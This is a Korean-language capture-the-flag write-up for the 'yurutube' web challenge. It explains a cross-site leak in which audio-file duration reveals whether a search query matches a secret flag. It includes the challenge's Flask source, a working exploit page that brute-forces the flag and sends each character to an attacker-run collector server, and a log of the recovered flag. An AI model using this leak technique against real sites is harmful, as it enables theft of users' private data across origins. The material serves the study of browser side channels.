# yurutube

# Usage

# Concept
- XSLeak
# Writeup

음성파일길이를 교차사이트에서 유출하여 FLAG를 얻는 문제입니다.

### app.py
```py
from flask import Flask, request, send_file, render_template
from selenium import webdriver
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from time import sleep

app = Flask(__name__)

with open('flag.txt', 'r') as file:
    FLAG = file.read().strip()

with open('dummy.txt', 'r') as file:
    DUMMY = file.read().strip()

@app.after_request
def set_headers(response):
    response.headers['Cross-Origin-Embedder-Policy'] = 'require-corp'
    response.headers['Cross-Origin-Opener-Policy'] = 'same-origin'
    response.headers['X-Frame-Options'] = 'DENY'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    response.headers['Cache-Control'] = 'no-store'
    response.headers['Document-Policy'] = 'force-load-at-top'
    response.headers['Referrer-Policy'] = 'no-referrer'
    return response

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/search')
def search():
    query = request.args.get('query', '')
    
    if request.remote_addr == '127.0.0.1' and request.host == 'localhost':
        audio_id = '1' if FLAG.startswith(query) else '0'
    else:
        audio_id = '1' if DUMMY.startswith(query) else '0'
        
    try:
        return send_file(f'static/audio/{audio_id}.wav', mimetype='audio/wav')
    except:
        return "Audio file not found", 404

@app.route("/report", methods=["GET", "POST"])
def report():
    if request.method == "POST":
        url = request.form.get("url")
        if not url:
            return render_template("report.html", msg="fail")
        if check_url(url):
            return render_template("report.html", msg="success")
        else:
            return render_template("report.html", msg="fail")
    else:
        return render_template("report.html")

def check_url(url):
    if not (url.startswith("http://") or url.startswith("https://")):
        return False
    try:
        service = Service(ChromeDriverManager().install())
        options = webdriver.ChromeOptions()
        options.add_argument("--headless=new")
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--js-flags=--noexpose_wasm,--jitless')
        driver = webdriver.Chrome(service=service, options=options)
        driver.set_page_load_timeout(3)
        driver.get(url)
        sleep(25)
        return True
    except Exception as e:
        print(f"Error in check_url: {str(e)}")
        return False
    finally:
        driver.quit()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
```

**일단 유출하려면 크롬 정책에 의해  https:// 인 공격자 서버가 필요합니다.**

```py
@app.route('/search')
def search():
    query = request.args.get('query', '')
    
    if request.remote_addr == '127.0.0.1' and request.host == 'localhost':
        audio_id = '1' if FLAG.startswith(query) else '0'
    else:
        audio_id = '1' if DUMMY.startswith(query) else '0'
        
    try:
        return send_file(f'static/audio/{audio_id}.wav', mimetype='audio/wav')
    except:
        return "Audio file not found", 404
```
search엔드포인트에서 보면 `if request.remote_addr == '127.0.0.1' and request.host == 'localhost':`
이 if문에 의해 봇이 방문했을때 쿼리값이 FLAG로 시작하면 1.wav를 반환하고 아니면 0.wav를 반환합니다.

즉 교차사이트에서 1.wav와 0.wav의 차이를 유출할 수 있다면 FLAG를 얻을 수 있습니다.

참고로 1.wav와 0.wav의 차이는 1.wav가 30.1초 짜리 파일이고 0.wav가 30초 짜리 파일입니다.

모든 파일을 제공하기 때문에 영상길이를 파악하는 방법은 다양하게 구할 수 있습니다. 

audio의 경우 교차사이트에서 길이를 구할 수 있습니다. 

```js
const leak = async (url) => {
    return new Promise(r => {
        let audio = document.createElement('audio')
        audio.src = url
        audio.onloadedmetadata = (e) => {
            let duration = e.target.duration
            e.target.remove()
            console.debug(duration)
            // short hardcoded file should be 0.251451
            if(duration < 0.3){
                return r(0)
            }else{
                return r(1)
            }
        }
        document.body.appendChild(audio)
    })
}
```
해당 코드가 예시코드입니다. 

음성파일의 길이를 교차사이트에서 유출할수 있기 때문에 길이가 30.1초인 쿼리값만 파악하는 자동화 익스플로잇 코드를 만든뒤 

봇이 방문하면 FLAG를 얻을 수 있습니다.


#### exploit

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>solv</title>
</head>
<body>
    <script>
        const ALPHABET = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
        const FLAG_START = '{{ flag }}';
        
        const leak = async (url) => {
            return new Promise(r => {
                let audio = document.createElement('audio')
                audio.src = url
                audio.onloadedmetadata = (e) => {
                    let duration = e.target.duration
                    e.target.remove()
                    console.debug(duration)
                    // 30초면 false(0), 30.1초면 true(1) 반환
                    if(duration <= 30.0){
                        return r(0)
                    }else{
                        return r(1)
                    }
                }
                document.body.appendChild(audio)
            })
        }

        const exploit = async () => {
            let flag = FLAG_START;	
            while (!flag.includes("}")) {
                for (let char of ALPHABET) {
                    if (await leak(`http://localhost/search?query=${flag + char}`)) {
                        flag += char;
                        await fetch('/addFLAG?flag=' + char);
                        break;
                    }
                }
            }
        }
        exploit();
    </script>
</body>
</html>
```

#### solv.py
```py
from flask import Flask, request, render_template

flag = ""
app = Flask(__name__)

@app.route('/')
def index():
    return "Hello, World!"

@app.route('/solv')
def solv():
    return render_template('index.html',flag=flag)

@app.route('/addFLAG')
def addFLAG():
    global flag
    if 'flag' in request.args:
        flag += request.args['flag']
        print(flag)
        return 'added'
    return 'no flag'


@app.route('/getFlag')
def getFlag():
    return flag


if __name__ == '__main__':
    app.run('0.0.0.0', port=80)
```
해당 코드를 실행하고 포트포워딩 후 
https://인 공격자 서버를 봇이 방문하면 대략 20초 내외로 FLAG전부를 구할 수 있습니다.

```
172.17.0.1 - - [10/Nov/2024 04:15:09] "GET /addFLAG?flag=_ HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_D
172.17.0.1 - - [10/Nov/2024 04:15:09] "GET /addFLAG?flag=D HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_Du
172.17.0.1 - - [10/Nov/2024 04:15:10] "GET /addFLAG?flag=u HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_Dur
172.17.0.1 - - [10/Nov/2024 04:15:10] "GET /addFLAG?flag=r HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurA
172.17.0.1 - - [10/Nov/2024 04:15:10] "GET /addFLAG?flag=A HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAt
172.17.0.1 - - [10/Nov/2024 04:15:11] "GET /addFLAG?flag=t HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtI
172.17.0.1 - - [10/Nov/2024 04:15:11] "GET /addFLAG?flag=I HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtIO
172.17.0.1 - - [10/Nov/2024 04:15:12] "GET /addFLAG?flag=O HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtIOn
172.17.0.1 - - [10/Nov/2024 04:15:12] "GET /addFLAG?flag=n HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtIOn_
172.17.0.1 - - [10/Nov/2024 04:15:13] "GET /addFLAG?flag=_ HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtIOn_O
172.17.0.1 - - [10/Nov/2024 04:15:13] "GET /addFLAG?flag=O HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtIOn_Of
172.17.0.1 - - [10/Nov/2024 04:15:13] "GET /addFLAG?flag=f HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtIOn_Of_
172.17.0.1 - - [10/Nov/2024 04:15:14] "GET /addFLAG?flag=_ HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtIOn_Of_4
172.17.0.1 - - [10/Nov/2024 04:15:15] "GET /addFLAG?flag=4 HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtIOn_Of_4u
172.17.0.1 - - [10/Nov/2024 04:15:16] "GET /addFLAG?flag=u HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtIOn_Of_4ud
172.17.0.1 - - [10/Nov/2024 04:15:16] "GET /addFLAG?flag=d HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtIOn_Of_4udi
172.17.0.1 - - [10/Nov/2024 04:15:16] "GET /addFLAG?flag=i HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtIOn_Of_4udio
172.17.0.1 - - [10/Nov/2024 04:15:16] "GET /addFLAG?flag=o HTTP/1.1" 200 -
hspace{Cr0Ss_SiTe_LeaK_DurAtIOn_Of_4udio}
172.17.0.1 - - [10/Nov/2024 04:15:17] "GET /addFLAG?flag=} HTTP/1.1" 200 -
```